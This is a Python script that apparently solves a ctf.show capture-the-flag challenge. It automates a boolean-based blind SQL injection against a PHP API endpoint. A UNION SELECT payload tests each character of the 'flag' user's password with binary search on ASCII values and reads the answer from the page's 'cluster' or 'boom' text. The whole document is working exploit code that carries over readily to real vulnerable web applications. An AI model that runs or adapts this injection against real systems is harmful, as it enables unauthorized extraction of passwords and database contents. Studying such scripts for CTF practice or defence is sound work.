import requests

payload = "0' union select 'a',if(ascii(substr((select password from ctfshow_user4 where username='flag'), {},1))>{},'cluster','boom') %23"
url = "http://168b1d40-414d-4b42-a7cd-1cb5fd00bfe6.challenge.ctf.show:8080/api/v4.php?id="


def test_chr(index: int, offset: int):
    response = requests.get(url + payload.format(index, offset))
    assert "cluster" in response.text or "boom" in response.text
    if "cluster" in response.text:
        return True
    elif "boom" in response.text:
        return False


index = 1
flag = ""
while True:
    start = 32
    end = 127
    while True:
        if abs(start-end) == 1 or start == end:
            break
        point = (start + end) // 2
        if test_chr(index, point):
            start = point
        else:
            end = point
    if end < start:
        end = start
    flag += chr(end)
    print(f"[*] flag: {flag}")
    index += 1
